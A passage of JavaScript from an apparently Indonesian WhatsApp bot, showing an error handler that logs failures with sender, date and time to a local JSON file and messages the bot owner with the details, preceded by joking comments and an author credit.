// Gua belike : kamu nanya:v

// Kan di thumbnail no enc 100%?
// Gua belike : function nya langka bro

/*━━━━━━━━━━━━━━━━━━━━━━━━━━━━*/

// AUTHOR : LEXXY OFFICIAL
// INI CONSOLE LOG JNGN EDIT

}} catch (err) {
console.log(color('[ERROR]', 'red'), err)
const isGroup = msg.key.remoteJid.endsWith('@g.us')
const sender = isGroup ? (msg.key.participant ? msg.key.participant : msg.participant) : msg.key.remoteJid
const moment = require("moment-timezone");
const jam = moment.tz('asia/jakarta').format('HH:mm:ss')
const tanggal = moment().tz("Asia/Jakarta").format("ll")
let kon_erorr = {"tanggal": tanggal, "jam": jam, "error": err, "user": sender}
db_error.push(kon_erorr)
fs.writeFileSync('./database/error.json', JSON.stringify(db_error))
var errny =`*SERVER ERROR*
*Dari:* @${sender.split("@")[0]}
*Jam:* ${jam}
*Tanggal:* ${tanggal}
*Tercatat:* ${db_error.length}
*Type:* ${err}`
conn.sendMessage(setting.ownerNumber, {text:errny, mentions:[sender]})
}}